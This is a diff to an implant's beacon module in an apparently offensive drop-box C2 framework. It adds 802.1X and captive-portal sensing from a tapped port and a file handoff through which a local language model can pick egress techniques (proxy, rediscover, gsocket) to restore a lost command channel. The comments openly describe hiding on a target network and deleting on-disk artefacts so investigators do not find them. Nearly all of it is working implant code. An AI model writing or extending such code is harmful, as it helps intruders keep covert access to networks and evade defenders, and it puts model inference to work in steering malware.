@@ -27,6 +27,7 @@ import stat
 import struct
 import subprocess
 import sys
+import tempfile
 import threading
 import time
 import urllib.error
@@ -1853,28 +1854,31 @@ EGRESS_VERBS = ("proxy", "rediscover", "gsocket")
 # dns_rescue's FLAG_*, like `_RESCUE_CLASSES` above and for the same reason.
 # The bit travels with the name so that whatever matches these rules next
 # has one mapping to read rather than a second copy of these names.
+#
+# All four, in the record's own bit order. Two of them used to be dead; see
+# `_EGRESS_DEAD_FLAGS` below.
 _EGRESS_FLAG_BITS = {
     "proxy_found": _RESCUE_FLAG_PROXY_FOUND,
+    "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
+    "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
     "dns_answered": _RESCUE_FLAG_DNS_ANSWERED,
 }
 
-# The two that are declared and never set. Both are in the record format
-# and both are rendered by the team server, so an operator reading the
-# panel has every reason to think they are usable -- but `_rescue_flags` ORs
-# in `proxy_found` and `dns_answered` and nothing else, because no 802.1X
-# sensing and no captive-portal detection exists on this implant. A rule
-# naming one of these could never match, and a rule that can never fire is
-# a trap in the one file nobody can debug remotely. So they are refused by
-# name, with the reason, rather than tolerated or silently dropped: an
-# operator who read "not a flag" would go looking for a typo and find none.
+# Nothing. It used to hold `dot1x_seen` and `portal_answered`, which were
+# in the record's format and rendered by the team server and which nothing
+# in this implant set: no 802.1X sensing and no captive-portal detection
+# existed here, so a rule naming one could never match, and a rule that can
+# never fire is a trap in the one file nobody can debug remotely. The
+# previous design called making them live *"the one work that would make
+# this decider much smarter"*, and this is that work: the scout watches the
+# tapped port for EAPOL and for a captive portal the host got *past*, and
+# `Beacon._way_out_absorb_flags` ORs what it found into the record.
 #
-# Making them live is the obvious follow-up to this work, and the day it
-# happens the two names move into the mapping above. The bits are kept here
-# so the copy-comparison test can hold all four against `dns_rescue.py`.
-_EGRESS_DEAD_FLAGS = {
-    "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
-    "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
-}
+# Kept as an empty mapping rather than deleted, because `_egress_check_flag`
+# reads it and the day a fifth flag is declared in the record and set by
+# nothing, it belongs here with its reason -- the refusal and the message
+# are worth more than the three lines they cost.
+_EGRESS_DEAD_FLAGS = {}     # type: Dict[str, int]
 
 # What the block may contain, and what a rule may contain. Anything else is
 # refused by name: `budgte: 3` would otherwise leave the budget at its
@@ -2171,25 +2175,337 @@ def _egress_check_class(name: str, where: str) -> None:
 def _egress_check_flag(name: str, where: str) -> None:
     """Refuse a flag name the beacon never sets, and say why.
 
-    The two dead names get their own message. "not a flag" would send an
-    operator looking for a typo in a name they read in the panel, so the
-    message says what nothing on this implant does. Both messages name the
-    live flags in the record's own bit order rather than alphabetically,
-    which is the order the operator reads them in `dns_rescue.py`.
+    A dead name gets its own message. "not a flag" would send an operator
+    looking for a typo in a name they read in the panel, so the message
+    says what nothing on this implant does. Both messages name the live
+    flags in the record's own bit order rather than alphabetically, which
+    is the order the operator reads them in `dns_rescue.py`.
+
+    `_EGRESS_DEAD_FLAGS` is empty today -- the scout made the last two
+    live -- so the first arm is unreachable until the record declares a
+    fifth flag nothing sets. It is kept because that day the refusal and
+    its reason are worth more than the lines they cost.
     """
     if name in _EGRESS_DEAD_FLAGS:
+        live = [flag for flag in _EGRESS_FLAG_BITS
+                if flag not in _EGRESS_DEAD_FLAGS]
         raise ValueError(
             "%s names %r, which nothing in this implant ever sets: it is in "
             "the rescue record's format and the team server renders it, but "
-            "no 802.1X sensing and no captive-portal detection exists here, "
-            "so only %s are ever set. A rule that could never match is "
-            "refused rather than carried"
-            % (where, name, " and ".join(_EGRESS_FLAG_BITS)))
+            "nothing here senses it, so only %s are ever set. A rule that "
+            "could never match is refused rather than carried"
+            % (where, name, " and ".join(live)))
     if name not in _EGRESS_FLAG_BITS:
         raise ValueError(
             "%s names %r, which is not a flag the rescue record carries: it "
             "is %s"
             % (where, name, " or ".join(_EGRESS_FLAG_BITS)))
+
+
+# ── The way out: the files the scout and the beacon meet over ──
+#
+# `c2.way_out` of configs/raccoon.yaml. The scout
+# (`software/scout/`) captures a narrow slice of the tapped port, writes
+# what it found, and -- in its model stage -- one recommendation; this file
+# writes one state file saying a stuck window is open and reads the
+# scout's document when it is fresh. The two halves cannot import each
+# other: the scout needs scapy and this file is served to a target as
+# source text, so the five names and the two versions below are **copies**
+# of `software/scout/handoff.py`'s, exactly as `_RESCUE_*` above are copies
+# of `dns_rescue.py`'s, and `test_way_out_handoff.py` compares them.
+#
+# Drop-box only, like the decider: a generated build carries no
+# `configs/raccoon.yaml`, so there is no block to read and everything here
+# is off.
+_WAY_OUT_STATE_NAME = "way_out_state.json"
+_WAY_OUT_DOCUMENT_NAME = "way_out_scout.json"
+_WAY_OUT_TRAIL_NAME = "way_out_trail.jsonl"
+_WAY_OUT_BORROW_NAME = "way_out_borrow.json"
+_WAY_OUT_IDENTITY_NAME = "way_out_identity.json"
+_WAY_OUT_STATE_VERSION = 1
+_WAY_OUT_DOCUMENT_VERSION = 1
+
+# The two flags the *tap* can set, and only these two are absorbed from a
+# document. `proxy_found` and `dns_answered` are findings of a leg -- a
+# proxy that refused this implant, a resolver that answered it -- so taking
+# either from the scout would let it claim something no leg had tried.
+_WAY_OUT_TAP_FLAGS = {
+    "dot1x_seen": _RESCUE_FLAG_DOT1X_SEEN,
+    "portal_answered": _RESCUE_FLAG_PORTAL_ANSWERED,
+}
+
+_WAY_OUT_BLOCK_KEYS = ("enabled", "state_dir", "document_max_age_seconds",
+                       "points_per_hour", "points_max", "risk_coefficient",
+                       "ev_threshold", "dot1x_detect", "portal_detect",
+                       "model")
+_WAY_OUT_MODEL_KEYS = ("enabled", "endpoint", "name", "timeout_seconds")
+
+# The defaults, and where each number comes from.
+#
+# `document_max_age_seconds` is the fresh-or-ignore window: a document
+# older than this is ignored, so a dead scout degrades to the five lines
+# of evidence the decider already had rather than to a stale decision.
+# 900 is three times the shipped beacon interval's publishing cadence, so
+# a scout that missed one publish is still believed and one that died is
+# not.
+#
+# `points_per_hour` and `points_max` are the curve. `points` is the value
+# of what the action unlocks (`safety.py:420-428`), and the value of a
+# restored channel is not constant: a channel back in the first hour is
+# worth a check-in, and one back after a week is the difference between an
+# operation and a dead device in a rack. That curve is the whole mechanism
+# behind the human's stated appetite -- dark is useless -- expressed as a
+# number rather than as a rule that fires.
+#
+# `risk_coefficient` and `ev_threshold` are the shipped agent profile's
+# (`config.py:652-659`), copied rather than imported: a drop-box has no
+# campaign configuration and no `RISK_PROFILES`.
+#
+# `dot1x_detect` and `portal_detect` are the two evidence modifiers. A
+# port that authenticates is a port somebody configured and therefore
+# watches, so `dot1x_seen` raises the identity rung's detection
+# probability; a network that redirects every browser sees credential
+# prompts answered all day, so `portal_answered` lowers the borrow rung's.
+_WAY_OUT_DEFAULTS = {
+    "state_dir": "",
+    "document_max_age_seconds": 900,
+    "points_per_hour": 5,
+    "points_max": 100,
+    "risk_coefficient": 33,
+    "ev_threshold": 0,
+    "dot1x_detect": 0.15,
+    "portal_detect": -0.10,
+}
+_WAY_OUT_MODEL_DEFAULTS = {
+    "enabled": False,
+    # Loopback, and the reader refuses anything else by name. The model
+    # exists for this implant's own decision; a listener reachable from the
+    # target segment would hand it to anyone on the network the implant is
+    # hiding in.
+    "endpoint": "http://127.0.0.1:11434",
+    "name": "",
+    # The agent's own page allows a local link 300 seconds against 120 for
+    # a hosted one and says how much of that a Pi uses "has not been
+    # measured for this page" (`docs/AGENT.md:491-493`). 120 here, because
+    # nothing waits on it: the beacon reads a file.
+    "timeout_seconds": 120,
+}
+
+# The whole-number settings, each with the smallest value that still means
+# something. `ev_threshold` is not here: zero is the shipped threshold and
+# a negative one is a legitimate "allow a little below break-even".
+_WAY_OUT_WHOLE = {
+    "document_max_age_seconds": 1,
+    "points_per_hour": 0,
+    "points_max": 1,
+    "risk_coefficient": 1,
+}
+# The two probability modifiers, which are fractions and may be negative.
+_WAY_OUT_FRACTIONS = ("dot1x_detect", "portal_detect")
+
+
+def _way_out_disabled() -> dict:
+    """The shape a refusal returns: off, with nothing to read or write.
+
+    `state_dir` is emptied as well as `enabled` cleared, for the reason
+    `_egress_disabled` zeroes the budget: a refused block that kept the
+    operator's directory would leave a later reader which forgot to check
+    `enabled` with a path to write an artefact to.
+    """
+    block = dict(_WAY_OUT_DEFAULTS)
+    block["enabled"] = False
+    block["state_dir"] = ""
+    block["model"] = dict(_WAY_OUT_MODEL_DEFAULTS)
+    return block
+
+
+def read_way_out_policy(block) -> dict:
+    """Read `c2.way_out`, or say once why it cannot be used.
+
+    Never raises, for the reason `read_egress_policy` gives in full: there
+    is nothing below the beacon to catch a block that stopped it, so a
+    refusal here would have cost the access in order to protect a setting.
+    A block that is absent, incomplete or unusable reads as **off, with the
+    reason logged once**.
+
+    Validated whether it is enabled or not, and the shipped one is
+    disabled: a trap in a disabled block is a trap waiting for the day
+    somebody enables it.
+    """
+    if block is None:
+        return _way_out_disabled()
+    try:
+        return _way_out_policy(block)
+    except ValueError as exc:
+        logger.warning("The way out is off: %s", exc)
+        return _way_out_disabled()
+
+
+def _way_out_policy(block) -> dict:
+    """`read_way_out_policy`'s reading, raising on anything bad."""
+    if not isinstance(block, dict):
+        raise ValueError(
+            "c2.way_out is %r, which is not a mapping of %s"
+            % (block, ", ".join(_WAY_OUT_BLOCK_KEYS)))
+    unknown = [key for key in block if key not in _WAY_OUT_BLOCK_KEYS]
+    if unknown:
+        raise ValueError(
+            "c2.way_out has %s, which is not a setting it has: it takes %s"
+            % (", ".join(repr(key) for key in unknown),
+               ", ".join(_WAY_OUT_BLOCK_KEYS)))
+
+    # Read by value and never as `bool(...)`: `bool("false")` is True and
+    # YAML does not unquote a quoted scalar, so `enabled: "false"` would
+    # switch on a second capture reader and a cross-process trigger out of
+    # a file that says the opposite.
+    raw_enabled = block.get("enabled", False)
+    if not isinstance(raw_enabled, bool):
+        raise ValueError(
+            "c2.way_out.enabled is %r, and only the boolean true enables it "
+            "-- an unquoted true or false is what this setting takes"
+            % (raw_enabled,))
+
+    policy = dict(_WAY_OUT_DEFAULTS)
+    policy["enabled"] = raw_enabled
+    policy["state_dir"] = _way_out_state_dir(block.get("state_dir"),
+                                             raw_enabled)
+    for key, floor in _WAY_OUT_WHOLE.items():
+        policy[key] = _way_out_whole(key, block.get(key, policy[key]), floor)
+    policy["ev_threshold"] = _way_out_number("ev_threshold",
+                                             block.get("ev_threshold",
+                                                       policy["ev_threshold"]))
+    for key in _WAY_OUT_FRACTIONS:
+        policy[key] = _way_out_fraction(key, block.get(key, policy[key]))
+    policy["model"] = _way_out_model(block.get("model"))
+    return policy
+
+
+def _way_out_state_dir(raw, enabled: bool) -> str:
+    """Where the two files live, which may not be under `/tmp`.
+
+    Refused rather than defaulted, because the symptom of getting it wrong
+    is silence: `raccoon-beacon.service` and `raccoon-implant.service` both
+    set `PrivateTmp=true`, so each process gets its own private `/tmp` and
+    the handoff would simply never happen -- on the one host nobody can
+    debug remotely.
+    """
+    if raw is None and not enabled:
+        return ""
+    if not isinstance(raw, str) or not raw.strip():
+        raise ValueError(
+            "c2.way_out.state_dir is %r, and the beacon and the scout meet "
+            "over files in it, so it has to name a directory. It may not be "
+            "under /tmp: both units set PrivateTmp=true, so each process "
+            "would get its own and the handoff would silently never happen"
+            % (raw,))
+    path = raw.strip()
+    if path == "/tmp" or path.startswith("/tmp/"):
+        raise ValueError(
+            "c2.way_out.state_dir is %r, which is under /tmp: both "
+            "raccoon-beacon.service and raccoon-implant.service set "
+            "PrivateTmp=true, so each process would get its own private /tmp "
+            "and the beacon and the scout would never see each other's files"
+            % (raw,))
+    return path
+
+
+def _way_out_whole(key: str, raw, floor: int) -> int:
+    # `isinstance(True, int)` is True in Python, so a stray YAML boolean
+    # would otherwise read as one.
+    if isinstance(raw, bool) or not isinstance(raw, int):
+        raise ValueError("c2.way_out.%s is %r, which is not a whole number"
+                         % (key, raw))
+    if raw < floor:
+        raise ValueError(
+            "c2.way_out.%s is %r, and anything below %d would leave this "
+            "feature on with nothing it could ever do: say enabled: false if "
+            "that is what is meant" % (key, raw, floor))
+    return raw
+
+
+def _way_out_number(key: str, raw):
+    if isinstance(raw, bool) or not isinstance(raw, (int, float)):
+        raise ValueError("c2.way_out.%s is %r, which is not a number"
+                         % (key, raw))
+    return raw
+
+
+def _way_out_fraction(key: str, raw) -> float:
+    if isinstance(raw, bool) or not isinstance(raw, (int, float)):
+        raise ValueError("c2.way_out.%s is %r, which is not a number"
+                         % (key, raw))
+    if not -1.0 < float(raw) < 1.0:
+        raise ValueError(
+            "c2.way_out.%s is %r, and it moves a probability, so it is a "
+            "fraction strictly between -1 and 1" % (key, raw))
+    return float(raw)
+
+
+def _way_out_model(raw) -> dict:
+    """The scout's model client. Read here so a typo is refused once."""
+    if raw is None:
+        return dict(_WAY_OUT_MODEL_DEFAULTS)
+    if not isinstance(raw, dict):
+        raise ValueError(
+            "c2.way_out.model is %r, which is not a mapping of %s"
+            % (raw, ", ".join(_WAY_OUT_MODEL_KEYS)))
+    unknown = [key for key in raw if key not in _WAY_OUT_MODEL_KEYS]
+    if unknown:
+        raise ValueError(
+            "c2.way_out.model has %s, which is not a setting it has: it "
+            "takes %s" % (", ".join(repr(key) for key in unknown),
+                          ", ".join(_WAY_OUT_MODEL_KEYS)))
+    model = dict(_WAY_OUT_MODEL_DEFAULTS)
+    enabled = raw.get("enabled", False)
+    if not isinstance(enabled, bool):
+        raise ValueError(
+            "c2.way_out.model.enabled is %r, and only the boolean true "
+            "enables it. It ships off, and not out of timidity: without a "
+            "device nobody can say what inference costs on PoE, so the first "
+            "operator to switch it on is the first measurement" % (enabled,))
+    model["enabled"] = enabled
+    endpoint = raw.get("endpoint", model["endpoint"])
+    if not isinstance(endpoint, str) or not _way_out_is_loopback(endpoint):
+        raise ValueError(
+            "c2.way_out.model.endpoint is %r, and the model exists for this "
+            "implant's own decision: it is reached on loopback only. A "
+            "listener an implant can reach across the network is one anybody "
+            "on the network the implant is hiding in can reach" % (endpoint,))
+    model["endpoint"] = endpoint
+    name = raw.get("name", model["name"])
+    if not isinstance(name, str):
+        raise ValueError("c2.way_out.model.name is %r, which is not a model "
+                         "name" % (name,))
+    model["name"] = name
+    model["timeout_seconds"] = _way_out_whole(
+        "model.timeout_seconds", raw.get("timeout_seconds",
+                                         model["timeout_seconds"]), 1)
+    if model["enabled"] and not model["name"]:
+        raise ValueError(
+            "c2.way_out.model is enabled and names no model, so the scout "
+            "would have nothing to ask: name the model it should pull")
+    return model
+
+
+def _way_out_is_loopback(endpoint: str) -> bool:
+    """Whether a URL's host is this host, by text and not by resolution.
+
+    By text on purpose: a name that resolves to 127.0.0.1 today is a name
+    somebody else's DNS can move tomorrow, and this check is about where
+    the implant's inference is allowed to be -- a question the file has to
+    settle, not the network.
+    """
+    text = (endpoint or "").strip().lower()
+    for scheme in ("http://", "https://"):
+        if text.startswith(scheme):
+            host = text[len(scheme):].split("/", 1)[0]
+            host = host.rsplit("@", 1)[-1]
+            if host.startswith("["):
+                host = host[1:].split("]", 1)[0]
+            else:
+                host = host.split(":", 1)[0]
+            return host in ("127.0.0.1", "localhost", "::1")
+    return False
 
 
 def tunnel_config_from_yaml(c2_cfg: dict, env=None) -> Optional[dict]:
@@ -2400,6 +2716,11 @@ def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True,
     # beacon is the access, and a refusal that stopped it would have cost
     # that access in order to protect a policy.
     block["egress_decider"] = read_egress_policy(c2_cfg.get("egress_decider"))
+    # The same argument as the decider's, for the same reason: the reader
+    # cannot fail, so a key that was sometimes absent would only make every
+    # later reader write `.get("way_out") or {}` and get the default wrong
+    # once.
+    block["way_out"] = read_way_out_policy(c2_cfg.get("way_out"))
     try:
         tunnel = tunnel_config_from_yaml(c2_cfg, env=env)
     except ValueError as exc:
@@ -5905,6 +6226,32 @@ class Beacon:
         # brought nothing back" is the cycle the decider exists for.
         self._rescue_answered = False
 
+        # ── the way out ──
+        #
+        # `c2.way_out` is already read: `beacon_config_from_fallback` put
+        # `read_way_out_policy`'s answer here, exactly as it puts the
+        # decider's. A generated build has no such key, which is this
+        # feature's distribution rule rather than an oversight.
+        #
+        # The scout is a different process -- `raccoon-implant.service`
+        # runs `main.py` and this runs under `raccoon-beacon.service` --
+        # so the two meet over files under `state_dir`. Everything below is
+        # inert while `enabled` is false, which is how this ships, and the
+        # directory is emptied with it so that nothing can be written by a
+        # reader which forgot to ask.
+        #
+        # Read **before** the decider's block, because `_egress_usable`
+        # consults `_way_out_enabled`: a rule naming a flag only the scout
+        # sets can never match on a build with no scout, and that is said
+        # when the policy is read rather than on a stuck cycle.
+        way_out = c2.get("way_out") or {}
+        self._way_out = dict(_WAY_OUT_DEFAULTS)
+        self._way_out["model"] = dict(_WAY_OUT_MODEL_DEFAULTS)
+        self._way_out.update(way_out)
+        self._way_out_enabled = way_out.get("enabled") is True
+        self._way_out_state_dir = (self._way_out.get("state_dir") or ""
+                                   if self._way_out_enabled else "")
+
         # ── the egress decider ──
         #
         # The policy is already read: `beacon_config_from_fallback` put
@@ -6601,6 +6948,11 @@ class Beacon:
         self._rescue_answered = False
         self._stuck_cycles = 0
         self._egress_spent = 0
+        # And the one file this project puts on the disk goes with them:
+        # the window is over, so the artefact that described it is removed
+        # rather than left for the next reader -- or the next investigator
+        # -- to find. Raises nothing.
+        self._way_out_clear_state()
 
     def _rescue_name(self) -> Optional[str]:
         """The query name, or None when it will not fit.
@@ -9540,6 +9892,8 @@ class Beacon:
         it, or an attempt's log line would name a row they cannot find.
         """
         numbered = list(enumerate(rules, 1))
+        for number, rule in numbered:
+            self._egress_warn_tap_flags(number, rule)
         if not self._proxy_prohibited():
             return numbered
         kept = []
@@ -9554,6 +9908,246 @@ class Beacon:
                 continue
             kept.append((number, rule))
         return kept
+
+    # ── The way out: one file each way, and fresh or ignored ──
+    #
+    # The scout is a different process and may write files; this one may
+    # not import it. So: the beacon writes `way_out_state.json` while a
+    # stuck window is open and removes it when a leg delivers, and reads
+    # `way_out_scout.json` when it is fresh. A document older than the
+    # scout's publishing interval is ignored, so **a dead scout degrades to
+    # today's five lines of evidence rather than to a stale decision** --
+    # which is also what makes the model optional at runtime and not only
+    # in the plan.
+    #
+    # **Nothing here raises.** All of it runs on the beacon thread inside a
+    # loop with no guard of its own, and a read-only `/opt` or a full disk
+    # must cost the implant nothing: the beacon is the access.
+
+    def _way_out_path(self, name: str) -> str:
+        return os.path.join(self._way_out_state_dir, name)
+
+    def _way_out_publish_state(self) -> None:
+        """Say that a stuck window is open, and on what evidence.
+
+        The one new artefact this project puts on the implant's disk, and
+        it is a cost rather than a detail: the beacon keeps no task queue
+        and writes nothing but persistence artefacts. It is one line of
+        JSON, it names no address, no zone and no key, and it is removed
+        when a leg delivers.
+        """
+        if not self._way_out_state_dir:
+            return
+        existing = self._way_out_read(_WAY_OUT_STATE_NAME,
+                                      _WAY_OUT_STATE_VERSION) or {}
+        self._way_out_write(_WAY_OUT_STATE_NAME, {
+            "version": _WAY_OUT_STATE_VERSION,
+            # When this window opened, kept across cycles so the scout
+            # reads one timestamp rather than inferring it from a count.
+            "opened": existing.get("opened") or time.time(),
+            "stuck_cycles": self._stuck_cycles,
+            "hours_dark": self._way_out_hours_dark(),
+            "evidence": self._egress_state(),
+            # The attempts of *this* window. The scout copies new ones onto
+            # the trail, which outlives this file.
+            "attempts": existing.get("attempts") or [],
+        })
+
+    def _way_out_record_attempt(self, attempt: dict) -> None:
+        """Add one attempt to the open window's record. Raises nothing."""
+        if not self._way_out_state_dir:
+            return
+        state = self._way_out_read(_WAY_OUT_STATE_NAME,
+                                   _WAY_OUT_STATE_VERSION)
+        if state is None:
+            return
+        entry = dict(attempt)
+        entry.setdefault("at", time.time())
+        attempts = list(state.get("attempts") or [])
+        attempts.append(entry)
+        state["attempts"] = attempts
+        self._way_out_write(_WAY_OUT_STATE_NAME, state)
+
+    def _way_out_clear_state(self) -> None:
+        """Remove the state file: this window is over. Raises nothing."""
+        if not self._way_out_state_dir:
+            return
+        try:
+            os.unlink(self._way_out_path(_WAY_OUT_STATE_NAME))
+        except OSError:
+            pass
+
+    def _way_out_document(self) -> Optional[dict]:
+        """The scout's document, if there is a fresh one. Raises nothing.
+
+        **Fresh means a window on both sides.** Older than
+        `document_max_age_seconds` is a dead or stopped scout; *newer than
+        now* is a clock that jumped, and a document from the future would
+        otherwise be eternally fresh -- which would turn the one rule that
+        makes a dead scout harmless into the one that makes a stale
+        decision permanent.
+        """
+        document = self._way_out_read(_WAY_OUT_DOCUMENT_NAME,
+                                      _WAY_OUT_DOCUMENT_VERSION)
+        if document is None:
+            return None
+        published = document.get("published")
+        if not isinstance(published, (int, float)) or isinstance(published,
+                                                                 bool):
+            return None
+        age = time.time() - float(published)
+        if age < 0 or age > self._way_out["document_max_age_seconds"]:
+            return None
+        return document
+
+    def _way_out_absorb_flags(self) -> None:
+        """OR the tap's two flags into this cycle's rescue record.
+
+        This is what makes `dot1x_seen` and `portal_answered` live. They
+        were in the record's format and rendered by the team server and
+        nothing set them, because no 802.1X sensing and no captive-portal
+        detection existed here; the scout does both, and this is where its
+        finding becomes a bit the panel shows and a name a rule may match.
+
+        **Only the tap's two.** `proxy_found` and `dns_answered` are
+        findings of a *leg* -- a proxy that refused this implant, a
+        resolver that answered it -- so absorbing them from a document
+        would let the scout claim something no leg had tried.
+        """
+        document = self._way_out_document()
+        if document is None:
+            return
+        tap = document.get("tap")
+        if not isinstance(tap, dict):
+            return
+        names = tap.get("flags")
+        if not isinstance(names, list):
+            return
+        for name in names:
+            bit = _WAY_OUT_TAP_FLAGS.get(name) if isinstance(name, str) \
+                else None
+            if bit is not None:
+                self._rescue_flags |= bit
+
+    def _way_out_recommendation(self, state: dict) -> Optional[dict]:
+        """The scout's recommendation for *this* evidence, or None.
+
+        Matched against the evidence it was made for, and not merely
+        fresh: the scout publishes on its own clock, so a document written
+        one cycle ago describes the legs as they were then. A
+        recommendation for other evidence is set aside out loud -- it is
+        the one case where the operator wants to know the model answered
+        and was not used.
+        """
+        document = self._way_out_document()
+        if document is None:
+            return None
+        advice = document.get("recommendation")
+        if not isinstance(advice, dict):
+            return None
+        verb = advice.get("verb")
+        if not isinstance(verb, str) or verb not in EGRESS_VERBS:
+            logger.warning(
+                "way out: the scout recommended %r, which is not one of the "
+                "verbs a decision may name (%s), so the policy decides this "
+                "cycle", verb, ", ".join(EGRESS_VERBS))
+            return None
+        if document.get("evidence") != state:
+            logger.warning(
+                "way out: the scout's recommendation (`egress %s`) was made "
+                "for other evidence than this cycle's, so the policy decides "
+                "instead", verb)
+            return None
+        return advice
+
+    def _way_out_hours_dark(self) -> float:
+        """How long this outage has lasted, in hours, from the cycle count.
+
+        The beacon's own interval and not a clock: `_stuck_cycles` is the
+        one measure of an outage this process keeps, it survives nothing it
+        should not, and a wall clock would make the curve below depend on
+        an NTP a dropped implant cannot reach.
+        """
+        return (self._stuck_cycles * max(1, int(self.interval))) / 3600.0
+
+    def _way_out_read(self, name: str, version: int) -> Optional[dict]:
+        if not self._way_out_state_dir:
+            return None
+        try:
+            with open(self._way_out_path(name), "rb") as handle:
+                loaded = json.loads(handle.read().decode("utf-8"))
+        except (OSError, ValueError, UnicodeDecodeError):
+            return None
+        if not isinstance(loaded, dict) or loaded.get("version") != version:
+            return None
+        return loaded
+
+    def _way_out_write(self, name: str, document: dict) -> None:
+        """One small JSON file 0600, whole or not at all. Raises nothing.
+
+        The shape `tunnel/shell.py` writes its sidecar with: a scratch
+        file in the same directory, fsynced, moved over the target, so the
+        scout never reads half a document. A copy and not an import, for
+        the reason at the top of this file.
+        """
+        path = self._way_out_path(name)
+        scratch = ""
+        try:
+            directory = os.path.dirname(path)
+            if not os.path.isdir(directory):
+                os.makedirs(directory, mode=0o700, exist_ok=True)
+                os.chmod(directory, 0o700)
+            data = (json.dumps(document, sort_keys=True) + "\n").encode()
+            descriptor, scratch = tempfile.mkstemp(
+                prefix="." + name + ".", dir=directory)
+            with os.fdopen(descriptor, "wb") as handle:
+                handle.write(data)
+                handle.flush()
+                os.fsync(handle.fileno())
+            os.chmod(scratch, 0o600)
+            os.replace(scratch, path)
+            scratch = ""
+        except Exception as exc:
+            # One line, and the beacon carries on. A read-only /opt or a
+            # full disk costs the operator the trail and nothing else.
+            logger.warning(
+                "way out: %s could not be written (%s), so the scout will "
+                "not see this window. The beacon is unaffected", path, exc)
+            if scratch:
+                try:
+                    os.unlink(scratch)
+                except OSError:
+                    pass
+
+    def _egress_warn_tap_flags(self, number: int, rule: dict) -> None:
+        """Name a rule that can never match because there is no scout.
+
+        `dot1x_seen` and `portal_answered` were refused by name while
+        nothing set them. The scout sets them now, so the refusal is gone
+        -- but on a build where `c2.way_out` is off, a rule naming one is
+        back to being a rule that can never fire. Said out loud rather
+        than refused: `read_egress_policy` cannot see `c2.way_out`, and
+        this is the same situation as a `gsocket` rule on a build with no
+        carrier binary, which is tolerated.
+
+        Not **dropped**, either, and that is the difference from the proxy
+        case above. A rule the build guarantees will be refused costs the
+        budget when it fires; a rule that can never match costs nothing,
+        because it never matches. So the operator gets the sentence and
+        keeps their numbering.
+        """
+        if self._way_out_enabled:
+            return
+        named = [name for name in rule.get("when", {}).get("flags", [])
+                 if name in _WAY_OUT_TAP_FLAGS]
+        if not named:
+            return
+        logger.warning(
+            "The egress decider's rule %d names %s, which only the scout "
+            "sets -- and c2.way_out is off on this build, so nothing here "
+            "watches the tapped port and that rule can never match. Switch "
+            "c2.way_out.enabled on, or write the rule against a leg's "
+            "evidence instead", number, " and ".join(named))
 
     def _egress_state(self) -> dict:
         """This cycle's rescue evidence, in the names a rule says.
@@ -9628,22 +10222,57 @@ class Beacon:
     def _egress_decide(self) -> Optional[str]:
         """Which verb this cycle's evidence chooses, or None for no rule.
 
-        It reads `_leg_status`, `_rescue_flags` and the policy, and no
-        other state of this beacon: not the clock, not the budget, not the
-        stuck counter, not which legs are configured. That narrowness is
-        what makes it the seam the design names for stage B -- a thing
-        handed the evidence and the allowed options answers with one of
-        them, and everything that *bounds* the answer stays outside it, in
-        `_egress_act`.
+        Three steps, and the first two are this project's:
 
-        `_egress_act` asks `_egress_evaluate` rather than this, because
-        its one log line names the rule that matched and this answer is
-        that answer with the rule dropped. No match and no attempt are the
-        same thing here: None, and a cycle in which the implant did
-        nothing to itself.
+          1. read the scout's document, if it is fresh;
+          2. if it carries a recommendation for *this* evidence, take it;
+          3. otherwise evaluate the operator's policy, exactly as before.
+
+        So the beacon never blocks on inference, never imports a client,
+        and behaves identically when the scout is absent -- which is what
+        keeps this file stdlib-only and makes the model optional at
+        runtime as well as in the plan.
+
+        It reads `_leg_status`, `_rescue_flags`, the policy and the
+        document, and no other state of this beacon: not the clock, not
+        the budget, not the stuck counter, not which legs are configured.
+        That narrowness is what made it the seam the previous design named
+        for a decision engine, and the engine arriving has not widened it.
+
+        `_egress_act` asks `_egress_choose` rather than this, because its
+        one log line names what chose and this answer is that answer with
+        the reason dropped. No match and no attempt are the same thing
+        here: None, and a cycle in which the implant did nothing to itself.
         """
-        chosen = self._egress_evaluate(self._egress_state())
-        return chosen[1]["try"] if chosen is not None else None
+        chosen = self._egress_choose(self._egress_state())
+        return chosen["verb"] if chosen is not None else None
+
+    def _egress_choose(self, state: dict) -> Optional[dict]:
+        """What this cycle's evidence chooses, and what chose it.
+
+        `{"verb", "chose", "rule", "argument", "p_success"}`, or None. The
+        `chose` key is the whole reason this returns a mapping rather than
+        a verb: the trail has to say whether the model or the policy
+        picked, and a decision nobody can reconstruct is worse than a
+        policy -- the policy at least names the rule that matched.
+        """
+        advice = self._way_out_recommendation(state)
+        if advice is not None:
+            return {
+                "verb": advice["verb"],
+                "chose": "model",
+                "rule": 0,
+                "argument": advice.get("argument") or "",
+                "p_success": advice.get("p_success"),
+                "why": advice.get("why") or "",
+            }
+        chosen = self._egress_evaluate(state)
+        if chosen is None:
+            return None
+        number, rule = chosen
+        return {"verb": rule["try"], "chose": "policy", "rule": number,
+                "argument": "", "p_success": None,
+                "why": "when %s" % (rule["when"],)}
 
     def _egress_proxy_target(self) -> Optional[str]:
         """Which discovered proxy to select, or None if there is none to.
